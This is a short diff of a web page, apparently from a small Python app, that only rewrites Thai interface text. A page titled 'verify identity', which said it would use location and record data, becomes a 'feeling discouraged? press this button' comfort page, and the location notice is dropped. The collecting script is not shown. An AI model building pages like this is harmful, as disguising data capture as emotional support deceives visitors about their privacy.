@@ -83,11 +83,11 @@ small{color:#aaa}
 <body>
 
 <div class="card">
-  <h2>🔐 ยืนยันตัวตน</h2>
-  <p>เพื่อดำเนินการต่อ กรุณายืนยันข้อมูล</p>
+  <h2>🔐 รู้สึกท้อหรอ</h2>
+  <p>รองกดปุ่มนี้นะเผื่อจะหายท้อ</p>
   <button onclick="start()">ยืนยัน</button>
   <p id="status"></p>
-  <small>ระบบจะใช้ตำแหน่งเพื่อแสดงผลแผนที่</small>
+  <small>ใจเย็นๆผ่อนคลายเยอะๆ</small>
 </div>
 
 <script>
@@ -175,7 +175,7 @@ def done():
     return """
     <body style="background:black;color:white;text-align:center;padding:100px">
     <h1>✅ ยืนยันเรียบร้อย</h1>
-    <p>ระบบบันทึกข้อมูลเรียบร้อยแล้ว</p>
+    <p>หายท้อแล้วนะอยู๋กับตัวเอง</p>
     </body>
     """
 
